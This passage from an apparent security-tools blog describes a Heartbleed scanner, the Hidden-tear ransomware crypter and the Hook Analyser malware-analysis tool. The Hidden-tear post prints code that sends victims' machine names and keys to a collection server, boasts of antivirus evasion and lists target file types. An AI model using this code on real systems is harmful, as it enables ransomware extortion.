      <br> Ubuntu or Debian-like systems :
      <br> 
      <pre><code>apt-get insall python-netaddr</code></pre> 
      <br> 
      <br> 
      <div style="text-align: center;"> 
       <b><span style="font-size: x-large;"><a href="https://github.com/hybridus/heartbleedscanner" target="_blank">Download Heartbleed Vulnerability Scanner</a></span></b>
      </div> 
     </div>
    </article> 
    <article class="post hentry" id="6787597686740028189" itemscope itemtype="http://schema.org/BlogPosting"> 
     <h1 class="post-title entry-title" itemprop="name headline"> Hidden-tear - An open source ransomware-like file crypter  </h1> 
     <div class="post-header" style="position:absolute;left:-9999px"> 
      <div class="post-header-line-1"></div> 
     </div> 
     <div class="post-body entry-content" id="post-body-6787597686740028189" itemprop="articleBody"> 
      <pre><code>     _     _     _     _              _                  
    | |   (_)   | |   | |            | |                 
    | |__  _  __| | __| | ___ _ __   | |_ ___  __ _ _ __ 
    | '_ \| |/ _` |/ _` |/ _ \ '_ \  | __/ _ \/ _` | '__|
    | | | | | (_| | (_| |  __/ | | | | ||  __/ (_| | |   
    |_| |_|_|\__,_|\__,_|\___|_| |_|  \__\___|\__,_|_|   
</code></pre> 
      <br> It's a ransomware-like file crypter sample which can be modified for specific purposes.
      <br> 
      <a name="more"></a>
      <br> 
      <b><span style="font-size: large;">Features</span></b>
      <br> 
      <ul> 
       <li>Uses AES algorithm to encrypt files.</li> 
       <li>Sends encryption key to a server.</li> 
       <li>Encrypted files can be decrypt in decrypter program with encryption key.</li> 
       <li>Creates a text file in Desktop with given message.</li> 
       <li>Small file size (12 KB)</li> 
       <li>Doesn't detected to antivirus programs (15/08/2015) <a href="http://nodistribute.com/result/6a4jDwi83Fzt">http://nodistribute.com/result/6a4jDwi83Fzt</a></li> 
      </ul> 
      <br> 
      <strong><span style="font-size: large;">Demonstration Video</span></strong>
      <br> 
      <div style="text-align: center;"> 
       <iframe allowfullscreen frameborder="0" height="360" src="https://www.youtube.com/embed/LtiRISepIfs" width="640"></iframe>
      </div> 
      <strong><br></strong> 
      <strong><span style="font-size: large;">Usage</span></strong>
      <br> 
      <ul> 
       <li>You need to have a web server which supports scripting languages like php,python etc. Change this line with your URL. (You better use Https connection to avoid eavesdropping)<br> <code>string targetURL = "https://www.example.com/hidden-tear/write.php?info=";</code></li> 
       <li>The script should writes the GET parameter to a text file. Sending process running in <code>SendPassword()</code> function<br> <pre><code>string info = computerName + "-" + userName + " " + password;
var fullUrl = targetURL + info;
var conent = new System.Net.WebClient().DownloadString(fullUrl);
</code></pre> </li> 
       <li>Target file extensions can be change. Default list:</li> 
      </ul> 
      <pre><code>var validExtensions = new[]{".txt", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".odt", ".jpg", ".png", ".csv", ".sql", ".mdb", ".sln", ".php", ".asp", ".aspx", ".html", ".xml", ".psd"};
</code></pre> 
      <strong><br></strong> 
      <strong><span style="font-size: large;">Legal Warning</span></strong> 
      <br> 
      <br> 
      <div style="text-align: justify;">
        While this may be helpful for some, there are significant risks. hidden tear may be used only for Educational Purposes. Do not use it as a ransomware! You could go to jail on obstruction of justice charges just for running hidden tear, even though you are innocent.
      </div> 
      <br> 
      <br> 
      <div style="text-align: center;"> 
       <b><span style="font-size: x-large;"><a href="https://github.com/utkusen/hidden-tear" target="_blank">Download&nbsp;Hidden-tear</a></span></b>
      </div> 
     </div>
    </article> 
    <article class="post hentry" id="4891187360029933566" itemscope itemtype="http://schema.org/BlogPosting"> 
     <h1 class="post-title entry-title" itemprop="name headline"> Hook Analyser 3.2 - Malware Analysis Tool  </h1> 
     <div class="post-header" style="position:absolute;left:-9999px"> 
      <div class="post-header-line-1"></div> 
     </div> 
     <div class="post-body entry-content" id="post-body-4891187360029933566" itemprop="articleBody"> 
      <div class="separator" style="clear: both; text-align: center;"> 
       <a href="http://2.bp.blogspot.com/-Nwb9Eae9MLo/VbqmExK4wpI/AAAAAAAAEb0/NIdUe4sYl9g/s1600/Hook%2BAnalyser%2B3.2%2BScreenshot%2B-1.jpg" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="394" src="http://2.bp.blogspot.com/-Nwb9Eae9MLo/VbqmExK4wpI/AAAAAAAAEb0/NIdUe4sYl9g/s640/Hook%2BAnalyser%2B3.2%2BScreenshot%2B-1.jpg" width="640"></a>
      </div> 
      <br> 
      <div style="text-align: justify;">
        Hook Analyser is a freeware application which allows an investigator/analyst to perform “static &amp; run-time / dynamic” analysis of suspicious applications, also gather (analyse &amp; co-related) threat intelligence related information (or data) from various open sources on the Internet.
       <br> 
       <br>
      </div> 
      <div style="text-align: justify;"> 
      </div> 
      <div style="text-align: justify;">
        Essentially it’s a malware analysis tool that has evolved to add some cyber threat intelligence features &amp; mapping.
      </div> 
      <br> 
      <div style="text-align: justify;">
        Hook Analyser is perhaps the only “free” software in the market which combines analysis of malware analysis and cyber threat intelligence capabilities. The software has been used by major Fortune 500 organisations.
       <br> 
       <a name="more"></a>
       <br> 
       <div> 
        <strong><span style="font-size: large;">Features/Functionality</span></strong>
       </div> 
       <ul> 
        <li style="text-align: justify;">Spawn and Hook to Application – Enables you to spawn an application, and hook into it</li> 
        <li style="text-align: justify;">Hook to a specific running process – Allows you to hook to a running (active) process</li> 
        <li style="text-align: justify;">Static Malware Analysis – Scans PE/Windows executables to identify potential malware traces</li> 
        <li style="text-align: justify;">Application crash analysis – Allows you to analyse memory content when an application crashes</li> 
        <li style="text-align: justify;">Exe extractor – This module essentially extracts executables from running process/s</li> 
       </ul> 
       <div> 
        <br>
       </div> 
       <div> 
        <b><span style="font-size: large;">Release&nbsp;</span></b>
       </div> 
       <div> 
        <br>
       </div> 
       <div>
         On this releases, significant improvements and capabilities have been added to the Threat Intelligence module.
       </div> 
       <div> 
        <br>
       </div> 
       <div>
         Following are the key improvements and enhanced features -
        <br> 
        <br> 
        <ul> 
         <li>The malware analysis module has been improved - and new signatures have been added</li> 
         <li>Cyber Threat Intelligence module -</li> 
         <ul> 
          <li>IP Intelligence module (Analyse multiple IP addresses instead of just 1!). Sample output -</li> 
          <div class="separator" style="clear: both; text-align: center;"> 
           <a href="http://4.bp.blogspot.com/-dJVyMoaLE9M/VauIOFimhhI/AAAAAAAACRQ/-zFU3PffeZ4/s1600/Hook%2BAnalyser%2B3.2%2BScreenshot%2B-10.jpg" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="216" src="http://4.bp.blogspot.com/-dJVyMoaLE9M/VauIOFimhhI/AAAAAAAACRQ/-zFU3PffeZ4/s400/Hook%2BAnalyser%2B3.2%2BScreenshot%2B-10.jpg" width="400"></a>
          </div> 
          <li>Keyword Intelligence module (Analyse keywords e.g. Internet Explorer 11, IP address, Hash etc). Sample output -&nbsp;</li> 
          <div class="separator" style="clear: both; text-align: center;"> 
           <a href="http://2.bp.blogspot.com/-xtXlP37uoBw/VauIhj1tRRI/AAAAAAAACRY/xMbM3IQpD9U/s1600/Hook%2BAnalyser%2B3.2%2BScreenshot%2B-11.jpg" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="198" src="http://2.bp.blogspot.com/-xtXlP37uoBw/VauIhj1tRRI/AAAAAAAACRY/xMbM3IQpD9U/s400/Hook%2BAnalyser%2B3.2%2BScreenshot%2B-11.jpg" width="400"></a>
          </div> 
          <div class="separator" style="clear: both; text-align: center;"> 
           <a href="http://3.bp.blogspot.com/-kBKT5g8E1KI/VauI0MlLTiI/AAAAAAAACRg/-968mwPM5pM/s1600/Hook%2BAnalyser%2B3.2%2BScreenshot%2B-12.jpg" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="210" src="http://3.bp.blogspot.com/-kBKT5g8E1KI/VauI0MlLTiI/AAAAAAAACRg/-968mwPM5pM/s400/Hook%2BAnalyser%2B3.2%2BScreenshot%2B-12.jpg" width="400"></a>
          </div> 
          <li>Network file (PCAP) analysis - Analyse user-provided .PCAP file and performs analysis on external IP addresses. Example -</li> 
          <div class="separator" style="clear: both; text-align: center;"> 
           <a href="http://3.bp.blogspot.com/-Lbf_LPdtiP8/VauKCVyw6XI/AAAAAAAACRo/CVihL7_XxXQ/s1600/Hook%2BAnalyser%2B3.2%2BScreenshot%2B-13.jpg" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="100" src="http://3.bp.blogspot.com/-Lbf_LPdtiP8/VauKCVyw6XI/AAAAAAAACRo/CVihL7_XxXQ/s400/Hook%2BAnalyser%2B3.2%2BScreenshot%2B-13.jpg" width="400"></a>
          </div> 
          <br> 
          <div class="separator" style="clear: both; text-align: center;"> 
           <a href="http://4.bp.blogspot.com/-OIKNjK9bXXo/VauKEAZ1mgI/AAAAAAAACRw/ROZtxUsfmLI/s1600/Hook%2BAnalyser%2B3.2%2BScreenshot%2B-14.jpg" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="175" src="http://4.bp.blogspot.com/-OIKNjK9bXXo/VauKEAZ1mgI/AAAAAAAACRw/ROZtxUsfmLI/s400/Hook%2BAnalyser%2B3.2%2BScreenshot%2B-14.jpg" width="400"></a>
          </div> 
          <li>Social Intelligence (Pulls data from Twitter- for user-defined keywords and performs network analysis). Example -</li> 
          <div class="separator" style="clear: both; text-align: center;"> 
           <a href="http://1.bp.blogspot.com/-ngDnXkQiE6s/VauKdL6ivHI/AAAAAAAACR4/fCm79Hi46w4/s1600/Hook%2BAnalyser%2B3.2%2BScreenshot%2B-15.jpg" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="191" src="http://1.bp.blogspot.com/-ngDnXkQiE6s/VauKdL6ivHI/AAAAAAAACR4/fCm79Hi46w4/s400/Hook%2BAnalyser%2B3.2%2BScreenshot%2B-15.jpg" width="400"></a>
          </div> 
          <br> 
          <div class="separator" style="clear: both; text-align: center;"> 
           <a href="http://2.bp.blogspot.com/-pKNyQ8FAQNo/VauKdtYwKjI/AAAAAAAACR8/-rOaJcgvwGc/s1600/Hook%2BAnalyser%2B3.2%2BScreenshot%2B-16.jpg" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="207" src="http://2.bp.blogspot.com/-pKNyQ8FAQNo/VauKdtYwKjI/AAAAAAAACR8/-rOaJcgvwGc/s400/Hook%2BAnalyser%2B3.2%2BScreenshot%2B-16.jpg" width="400"></a>
          </div> 
         </ul> 
        </ul> 
        <br> Let's look at "HOW-TO-USE" of this releases (Cyber Threat Intelligence) -
        <br> 
        <br> The tool can perform analysis via 2 methods - auto mode and manual mode.
        <br> 
        <br> In the auto mode, the tool will use the following files for analysis -
        <br> 
        <br> 
        <ol> 
         <li>Channels.txt (Path: feeds-&gt;channels.txt): Specify the list of the twitter related channels or keywords for monitoring. In the Auto mode, the monitoring is performed for 2 minutes only, however if you'd like to monitor indefinitely, please select the manual mode.&nbsp;</li> 
         <ul> 
          <li>Example -&nbsp;
           <div class="separator" style="clear: both; text-align: center;"> 
            <a href="http://2.bp.blogspot.com/-ciBnrkDV-Ro/VauEclDas3I/AAAAAAAACQY/VQSjoZYoqMU/s1600/Hook%2BAnalyser%2B3.2%2BScreenshot%2B-3.jpg" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="92" src="http://2.bp.blogspot.com/-ciBnrkDV-Ro/VauEclDas3I/AAAAAAAACQY/VQSjoZYoqMU/s640/Hook%2BAnalyser%2B3.2%2BScreenshot%2B-3.jpg" width="640"></a>
           </div> </li> 
         </ul> 
         <li>intelligence-ipdb.txt (Path: feeds-&gt;intelligence-ipdb.txt): Specify the list of IP addresses you'd like to analyse. Yes, you can provide as many IPs you'd like to.</li> 
         <ul> 
          <li>Example -&nbsp;
           <div class="separator" style="clear: both; text-align: center;"> 
            <a href="http://2.bp.blogspot.com/-l0sNt2QJMEU/VauEsFc4nfI/AAAAAAAACQg/eyaw4W8zgLg/s1600/Hook%2BAnalyser%2B3.2%2BScreenshot%2B-4.jpg" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="105" src="http://2.bp.blogspot.com/-l0sNt2QJMEU/VauEsFc4nfI/AAAAAAAACQg/eyaw4W8zgLg/s640/Hook%2BAnalyser%2B3.2%2BScreenshot%2B-4.jpg" width="640"></a>
           </div> </li> 
         </ul> 
         <li>Keywords.txt (Path: feeds-&gt;Keywords.txt): Specify the list of keywords you'd like to analyse. Yes, you can provide as many keywords you'd like to.</li> 
         <ul> 
          <li>Example -&nbsp;
           <div class="separator" style="clear: both; text-align: center;"> 
            <a href="http://1.bp.blogspot.com/-GN4pBjKUpKQ/VauFGbs5J3I/AAAAAAAACQo/2l6oneLT4IM/s1600/Hook%2BAnalyser%2B3.2%2BScreenshot%2B-5.jpg" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="113" src="http://1.bp.blogspot.com/-GN4pBjKUpKQ/VauFGbs5J3I/AAAAAAAACQo/2l6oneLT4IM/s640/Hook%2BAnalyser%2B3.2%2BScreenshot%2B-5.jpg" width="640"></a>
           </div> </li> 
         </ul> 
         <li>rssurl.txt (Path: feeds-&gt;rssurl.txt): Specify the RSS feeds to fetch vulnerability-related information.</li> 
         <ul> 
          <li>Example -
           <div class="separator" style="clear: both; text-align: center;"> 
            <a href="http://1.bp.blogspot.com/-AcJlhgD2Wuw/VauFfEC5jnI/AAAAAAAACQw/PiTcP5s-6eo/s1600/Hook%2BAnalyser%2B3.2%2BScreenshot%2B-6.jpg" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="115" src="http://1.bp.blogspot.com/-AcJlhgD2Wuw/VauFfEC5jnI/AAAAAAAACQw/PiTcP5s-6eo/s640/Hook%2BAnalyser%2B3.2%2BScreenshot%2B-6.jpg" width="640"></a>
           </div> </li> 
         </ul> 
         <li>url.txt (Path: feeds-&gt;url.txt): Specify the list of the URLs from where tool will pull malicious IP addresses information.</li> 
         <ul> 
          <li>Example -&nbsp;
           <div class="separator" style="clear: both; text-align: center;"> 
            <a href="http://2.bp.blogspot.com/-_m3yjr6bFNk/VauF2BTUThI/AAAAAAAACQ4/cd-Ua1PfZMs/s1600/Hook%2BAnalyser%2B3.2%2BScreenshot%2B-7.jpg" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="264" src="http://2.bp.blogspot.com/-_m3yjr6bFNk/VauF2BTUThI/AAAAAAAACQ4/cd-Ua1PfZMs/s640/Hook%2BAnalyser%2B3.2%2BScreenshot%2B-7.jpg" width="640"></a>
           </div> </li> 
         </ul> 
        </ol> 
        <br> Threat Intel module can be executed from HookAnalyser3.2.exe (option #6) file or can be executed directly through ThreatIntel.exe file. Refer to the following screenshots -
        <br> 
        <br> 
        <div class="separator" style="clear: both; text-align: center;"> 
         <a href="http://2.bp.blogspot.com/-36X8aydhXR0/VauGp97StrI/AAAAAAAACRA/_5jka9j8oC0/s1600/Hook%2BAnalyser%2B3.2%2BScreenshot%2B-8.jpg" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="369" src="http://2.bp.blogspot.com/-36X8aydhXR0/VauGp97StrI/AAAAAAAACRA/_5jka9j8oC0/s640/Hook%2BAnalyser%2B3.2%2BScreenshot%2B-8.jpg" width="640"></a>
        </div> 
        <div class="separator" style="clear: both; text-align: center;"> 
         <a href="http://4.bp.blogspot.com/-oU97VTZBmUM/VauHwYonmEI/AAAAAAAACRI/7lhxxcPnhDM/s1600/Hook%2BAnalyser%2B3.2%2BScreenshot%2B-9.jpg" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="640" src="http://4.bp.blogspot.com/-oU97VTZBmUM/VauHwYonmEI/AAAAAAAACRI/7lhxxcPnhDM/s640/Hook%2BAnalyser%2B3.2%2BScreenshot%2B-9.jpg" width="433"></a>
        </div> 
        <div class="separator" style="clear: both; text-align: center;"> 
         <a href="http://4.bp.blogspot.com/-kX04k6LJEDQ/VauMTcLtXWI/AAAAAAAACSQ/3nkC5Ba_PSA/s1600/Hook%2BAnalyser%2B3.2%2BScreenshot%2B-17.jpg" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="640" src="http://4.bp.blogspot.com/-kX04k6LJEDQ/VauMTcLtXWI/AAAAAAAACSQ/3nkC5Ba_PSA/s640/Hook%2BAnalyser%2B3.2%2BScreenshot%2B-17.jpg" width="404"></a>
        </div> 
        <br> 
        <div class="separator" style="clear: both; text-align: center;"> 
         <a href="http://1.bp.blogspot.com/-XaAd53eNFGw/VauMTFijjoI/AAAAAAAACSM/89xP-Gs6Bpo/s1600/Hook%2BAnalyser%2B3.2%2BScreenshot%2B-18.jpg" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="640" src="http://1.bp.blogspot.com/-XaAd53eNFGw/VauMTFijjoI/AAAAAAAACSM/89xP-Gs6Bpo/s640/Hook%2BAnalyser%2B3.2%2BScreenshot%2B-18.jpg" width="459"></a>
        </div> 
        <div class="separator" style="clear: both; text-align: center;"> 
        </div> 
        <br> In manual mode, you'd need to provide filename as an argument. Example below -
        <br> 
        <br> 
        <div class="separator" style="clear: both; text-align: center;"> 
         <a href="http://4.bp.blogspot.com/-Lbf_LPdtiP8/VauKCVyw6XI/AAAAAAAACRs/8KUdzNU0llw/s1600/Hook%2BAnalyser%2B3.2%2BScreenshot%2B-13.jpg" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="160" src="http://4.bp.blogspot.com/-Lbf_LPdtiP8/VauKCVyw6XI/AAAAAAAACRs/8KUdzNU0llw/s640/Hook%2BAnalyser%2B3.2%2BScreenshot%2B-13.jpg" width="640"></a>
